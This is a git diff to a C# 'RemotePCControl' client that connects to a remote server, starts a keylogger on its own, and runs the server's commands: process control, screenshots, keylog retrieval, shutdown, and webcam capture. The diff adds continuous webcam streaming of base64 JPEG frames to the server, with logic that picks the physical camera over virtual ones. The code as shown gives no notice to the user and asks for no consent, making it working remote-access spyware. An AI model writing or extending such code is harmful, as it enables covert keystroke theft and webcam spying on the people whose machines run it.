@@ -24,7 +24,12 @@ namespace RemotePCControl
         private string password;
         private bool isRunning = false;
         private KeyLogger keyLogger;
+
+        // Webcam streaming variables
         private VideoCaptureDevice videoDevice;
+        private bool isStreamingWebcam = false;
+        private Bitmap lastWebcamFrame = null;
+        private readonly object frameLock = new object();
 
         public ClientService(string serverIp, int serverPort)
         {
@@ -69,15 +74,13 @@ namespace RemotePCControl
                 stream = client.GetStream();
                 isRunning = true;
 
-                // Register với server
                 string registerMessage = $"REGISTER_CONTROLLED|{localIp}|{password}";
                 SendMessage(registerMessage);
 
-                // Start listening thread
                 Thread listenThread = new Thread(ListenForCommands);
+                listenThread.IsBackground = true;
                 listenThread.Start();
 
-                // Start keylogger
                 keyLogger = new KeyLogger();
                 keyLogger.Start();
 
@@ -96,7 +99,7 @@ namespace RemotePCControl
 
         private void ListenForCommands()
         {
-            byte[] lengthBuffer = new byte[4]; 
+            byte[] lengthBuffer = new byte[4];
 
             while (isRunning && client.Connected)
             {
@@ -121,7 +124,7 @@ namespace RemotePCControl
                     }
 
                     string message = Encoding.UTF8.GetString(messageBuffer, 0, messageLength);
-                    Console.WriteLine($"[RECEIVED] {message.Substring(0, Math.Min(message.Length, 100))}"); 
+                    Console.WriteLine($"[RECEIVED] {message.Substring(0, Math.Min(message.Length, 100))}");
 
                     ProcessCommand(message);
                 }
@@ -160,49 +163,39 @@ namespace RemotePCControl
                 {
                     case "LIST_APPS":
                         return ListApplications();
-
                     case "START_APP":
                         return StartApplication(parameters);
-
                     case "STOP_APP":
                         return StopApplication(parameters);
-
                     case "LIST_PROCESSES":
                         return ListProcesses();
-
                     case "START_PROCESS":
                         return StartProcess(parameters);
-
                     case "STOP_PROCESS":
                         return StopProcess(parameters);
-
                     case "SCREENSHOT":
                         return TakeScreenshot();
-
                     case "GET_KEYLOGS":
                         return GetKeyLogs();
-
                     case "CLEAR_KEYLOGS":
                         keyLogger.Clear();
                         return "SUCCESS|Keylogs cleared";
-
                     case "SHUTDOWN":
                         ShutdownPC();
                         return "SUCCESS|Shutting down";
-
                     case "RESTART":
                         RestartPC();
                         return "SUCCESS|Restarting";
-
                     case "WEBCAM_ON":
                         return StartWebcam();
-
                     case "WEBCAM_OFF":
                         return StopWebcam();
-
+                    case "WEBCAM_STREAM_START":
+                        return StartWebcamStreaming();
+                    case "WEBCAM_STREAM_STOP":
+                        return StopWebcamStreaming();
                     case "WEBCAM_CAPTURE":
                         return CaptureWebcam();
-
                     default:
                         return $"ERROR|Unknown command: {command}";
                 }
@@ -219,7 +212,6 @@ namespace RemotePCControl
                 .Where(p => !string.IsNullOrEmpty(p.MainWindowTitle))
                 .Select(p => $"{p.ProcessName}:{p.Id}:{p.MainWindowTitle}")
                 .ToList();
-
             return $"APPS|{string.Join("||", apps)}";
         }
 
@@ -242,7 +234,6 @@ namespace RemotePCControl
             var processes = Process.GetProcesses()
                 .Select(p => $"{p.ProcessName}:{p.Id}:{GetProcessMemory(p)}")
                 .ToList();
-
             return $"PROCESSES|{string.Join("||", processes)}";
         }
 
@@ -315,6 +306,8 @@ namespace RemotePCControl
             Process.Start("shutdown", "/r /t 0");
         }
 
+        // ==================== WEBCAM METHODS ====================
+
         private string StartWebcam()
         {
             try
@@ -323,39 +316,27 @@ namespace RemotePCControl
                 if (videoDevices.Count == 0)
                     return "ERROR|No webcam found";
 
-                //chose webcam device
-                FilterInfo chosenDevice = null;
-                Console.WriteLine("[AGENT] Auto-detecting best webcam...");
+                FilterInfo bestCamera = FindBestCamera(videoDevices);
+                if (bestCamera == null)
+                    return "ERROR|No suitable camera found";
 
-                foreach (FilterInfo device in videoDevices)
+                videoDevice = new VideoCaptureDevice(bestCamera.MonikerString);
+
+                if (videoDevice.VideoCapabilities.Length > 0)
                 {
-                    string nameLower = device.Name.ToLower();
-                    Console.WriteLine($"[AGENT] Found device: {device.Name}");
+                    var bestCapability = videoDevice.VideoCapabilities
+                        .OrderByDescending(c => c.FrameSize.Width * c.FrameSize.Height)
+                        .ThenByDescending(c => c.AverageFrameRate)
+                        .First();
 
-                    //skip virtual/IR cameras
-                    if (nameLower.Contains("virtual") ||
-                        nameLower.Contains("ir") ||
-                        nameLower.Contains("intel(r) virtual") ||
-                        nameLower.Contains("hello"))
-                    {
-                        Console.WriteLine("[AGENT] -> Skipping (virtual/IR camera).");
-                        continue;
-                    }
-
-                    chosenDevice = device;
-                    Console.WriteLine($"[AGENT] -> SELECTED this device!");
-                    break;
+                    videoDevice.VideoResolution = bestCapability;
+                    Console.WriteLine($"[WEBCAM] Resolution: {bestCapability.FrameSize.Width}x{bestCapability.FrameSize.Height} @ {bestCapability.AverageFrameRate}fps");
                 }
 
-                if (chosenDevice == null)
-                {
-                    throw new Exception("No suitable (non-virtual, non-IR) webcam found.");
-                }
-
-                videoDevice = new VideoCaptureDevice(chosenDevice.MonikerString);
+                videoDevice.NewFrame += VideoDevice_NewFrame;
                 videoDevice.Start();
 
-                return "SUCCESS|Webcam started";
+                return $"SUCCESS|Webcam started: {bestCamera.Name}";
             }
             catch (Exception ex)
             {
@@ -363,16 +344,254 @@ namespace RemotePCControl
             }
         }
 
+        private FilterInfo FindBestCamera(FilterInfoCollection devices)
+        {
+            string[] blacklist = new[]
+            {
+                "virtual", "obs", "snap", "droidcam", "iriun", "epoccam", "manycam",
+                "xsplit", "vcam", "e2esoft", "splitcam", "webcammax", "chromacam",
+                "nvidia broadcast", "ir camera", "infrared", "depth", "windows hello",
+                "intel(r) virtual"
+            };
+
+            string[] whitelist = new[]
+            {
+                "hd", "fhd", "1080p", "720p", "4k", "usb", "integrated", "built-in",
+                "logitech", "microsoft", "hp", "dell", "asus", "lenovo", "razer"
+            };
+
+            var candidates = new List<CameraCandidate>();
+
+            foreach (FilterInfo device in devices)
+            {
+                string deviceNameLower = device.Name.ToLower();
+                Console.WriteLine($"[WEBCAM] Scanning: {device.Name}");
+
+                bool isBlacklisted = blacklist.Any(keyword => deviceNameLower.Contains(keyword));
+                if (isBlacklisted)
+                {
+                    Console.WriteLine($"[WEBCAM] -> Skipped (blacklisted)");
+                    continue;
+                }
+
+                int score = 0;
+
+                foreach (var keyword in whitelist)
+                {
+                    if (deviceNameLower.Contains(keyword))
+                    {
+                        score += 10;
+                    }
+                }
+
+                try
+                {
+                    var tempDevice = new VideoCaptureDevice(device.MonikerString);
+                    if (tempDevice.VideoCapabilities.Length > 0)
+                    {
+                        var maxResolution = tempDevice.VideoCapabilities
+                            .Max(c => c.FrameSize.Width * c.FrameSize.Height);
+
+                        if (maxResolution >= 1920 * 1080) score += 50;
+                        else if (maxResolution >= 1280 * 720) score += 30;
+                        else if (maxResolution >= 640 * 480) score += 10;
+
+                        var maxFrameRate = tempDevice.VideoCapabilities
+                            .Max(c => c.AverageFrameRate);
+                        if (maxFrameRate >= 60) score += 20;
+                        else if (maxFrameRate >= 30) score += 10;
+                    }
+                }
+                catch
+                {
+                    score -= 20;
+                }
+
+                candidates.Add(new CameraCandidate
+                {
+                    Device = device,
+                    Score = score
+                });
+
+                Console.WriteLine($"[WEBCAM] -> Score: {score}");
+            }
+
+            var bestCandidate = candidates.OrderByDescending(c => c.Score).FirstOrDefault();
+
+            if (bestCandidate != null && bestCandidate.Score > 0)
+            {
+                Console.WriteLine($"[WEBCAM] ✓ SELECTED: {bestCandidate.Device.Name} (Score: {bestCandidate.Score})");
+                return bestCandidate.Device;
+            }
+
+            var fallback = devices.Cast<FilterInfo>()
+                .FirstOrDefault(d => !blacklist.Any(k => d.Name.ToLower().Contains(k)));
+
+            if (fallback != null)
+            {
+                Console.WriteLine($"[WEBCAM] Using fallback: {fallback.Name}");
+            }
+
+            return fallback;
+        }
+
+        private void VideoDevice_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            try
+            {
+                lock (frameLock)
+                {
+                    lastWebcamFrame?.Dispose();
+                    lastWebcamFrame = (Bitmap)eventArgs.Frame.Clone();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[ERROR] Frame capture: {ex.Message}");
+            }
+        }
+
+        private string StartWebcamStreaming()
+        {
+            try
+            {
+                if (videoDevice == null || !videoDevice.IsRunning)
+                    return "ERROR|Webcam not started. Please start webcam first.";
+
+                if (isStreamingWebcam)
+                    return "ERROR|Streaming already running";
+
+                isStreamingWebcam = true;
+
+                Thread streamThread = new Thread(StreamWebcamFrames);
+                streamThread.IsBackground = true;
+                streamThread.Start();
+
+                Console.WriteLine("[WEBCAM] Streaming started");
+                return "SUCCESS|Webcam streaming started";
+            }
+            catch (Exception ex)
+            {
+                return $"ERROR|{ex.Message}";
+            }
+        }
+
+        private void StreamWebcamFrames()
+        {
+            int framesSent = 0;
+            DateTime startTime = DateTime.Now;
+
+            while (isStreamingWebcam && videoDevice != null && videoDevice.IsRunning)
+            {
+                try
+                {
+                    string frame = GetWebcamFrame();
+                    if (frame.StartsWith("WEBCAM_FRAME|"))
+                    {
+                        SendResponse(frame);
+                        framesSent++;
+
+                        if (framesSent % 75 == 0)
+                        {
+                            double elapsed = (DateTime.Now - startTime).TotalSeconds;
+                            double fps = framesSent / elapsed;
+                            Console.WriteLine($"[WEBCAM] Streaming: {framesSent} frames sent, {fps:F1} fps");
+                        }
+                    }
+
+                    Thread.Sleep(66); // ~15 FPS
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[ERROR] Stream frame: {ex.Message}");
+                    Thread.Sleep(100);
+                }
+            }
+
+            Console.WriteLine($"[WEBCAM] Streaming stopped. Total frames sent: {framesSent}");
+        }
+
+        private string StopWebcamStreaming()
+        {
+            if (!isStreamingWebcam)
+                return "ERROR|Streaming not running";
+
+            isStreamingWebcam = false;
+            Console.WriteLine("[WEBCAM] Streaming stopped");
+            return "SUCCESS|Webcam streaming stopped";
+        }
+
+        private string GetWebcamFrame()
+        {
+            try
+            {
+                lock (frameLock)
+                {
+                    if (lastWebcamFrame == null)
+                        return "ERROR|No frame available";
+
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        var encoderParams = new EncoderParameters(1);
+                        encoderParams.Param[0] = new EncoderParameter(
+                            System.Drawing.Imaging.Encoder.Quality, 60L);
+
+                        var jpegCodec = GetEncoderInfo("image/jpeg");
+                        lastWebcamFrame.Save(ms, jpegCodec, encoderParams);
+
+                        byte[] imageBytes = ms.ToArray();
+                        string base64 = Convert.ToBase64String(imageBytes);
+                        return $"WEBCAM_FRAME|{base64}";
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                return $"ERROR|{ex.Message}";
+            }
+        }
+
+        private ImageCodecInfo GetEncoderInfo(string mimeType)
+        {
+            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
+            foreach (ImageCodecInfo codec in codecs)
+            {
+                if (codec.MimeType == mimeType)
+                    return codec;
+            }
+            return null;
+        }
+
         private string StopWebcam()
         {
-            if (videoDevice != null && videoDevice.IsRunning)
+            try
             {
-                videoDevice.SignalToStop();
-                videoDevice.WaitForStop();
-                videoDevice = null;
+                isStreamingWebcam = false;
+
+                if (videoDevice != null)
+                {
+                    if (videoDevice.IsRunning)
+                    {
+                        videoDevice.NewFrame -= VideoDevice_NewFrame;
+                        videoDevice.SignalToStop();
+                        videoDevice.WaitForStop();
+                    }
+                    videoDevice = null;
+                }
+
+                lock (frameLock)
+                {
+                    lastWebcamFrame?.Dispose();
+                    lastWebcamFrame = null;
+                }
+
+                Console.WriteLine("[WEBCAM] Camera stopped");
                 return "SUCCESS|Webcam stopped";
             }
-            return "ERROR|Webcam not running";
+            catch (Exception ex)
+            {
+                return $"ERROR|{ex.Message}";
+            }
         }
 
         private string CaptureWebcam()
@@ -382,26 +601,19 @@ namespace RemotePCControl
                 if (videoDevice == null || !videoDevice.IsRunning)
                     return "ERROR|Webcam not running";
 
-                Bitmap frame = null;
-                videoDevice.NewFrame += (sender, eventArgs) =>
+                lock (frameLock)
                 {
-                    frame = (Bitmap)eventArgs.Frame.Clone();
-                };
+                    if (lastWebcamFrame == null)
+                        return "ERROR|No frame available";
 
-                Thread.Sleep(500); // Wait for frame
-
-                if (frame != null)
-                {
                     using (MemoryStream ms = new MemoryStream())
                     {
-                        frame.Save(ms, ImageFormat.Jpeg);
+                        lastWebcamFrame.Save(ms, ImageFormat.Jpeg);
                         byte[] imageBytes = ms.ToArray();
                         string base64 = Convert.ToBase64String(imageBytes);
                         return $"WEBCAM_IMAGE|{base64}";
                     }
                 }
-
-                return "ERROR|No frame captured";
             }
             catch (Exception ex)
             {
@@ -409,12 +621,18 @@ namespace RemotePCControl
             }
         }
 
+        private class CameraCandidate
+        {
+            public FilterInfo Device { get; set; }
+            public int Score { get; set; }
+        }
+
         private void SendMessage(string message)
         {
             try
             {
                 byte[] data = Encoding.UTF8.GetBytes(message);
-                byte[] lengthPrefix = BitConverter.GetBytes(data.Length); 
+                byte[] lengthPrefix = BitConverter.GetBytes(data.Length);
 
                 stream.Write(lengthPrefix, 0, lengthPrefix.Length);
                 stream.Write(data, 0, data.Length);
@@ -441,14 +659,22 @@ namespace RemotePCControl
         public void Disconnect()
         {
             isRunning = false;
+            isStreamingWebcam = false;
             keyLogger?.Stop();
             StopWebcam();
+
+            lock (frameLock)
+            {
+                lastWebcamFrame?.Dispose();
+                lastWebcamFrame = null;
+            }
+
             stream?.Close();
             client?.Close();
+            Console.WriteLine("[CLIENT] Disconnected");
         }
     }
 
-    // KeyLogger Implementation
     public class KeyLogger
     {
         private StringBuilder logs = new StringBuilder();
@@ -461,6 +687,7 @@ namespace RemotePCControl
         {
             isRunning = true;
             Thread thread = new Thread(LogKeys);
+            thread.IsBackground = true;
             thread.Start();
         }
 
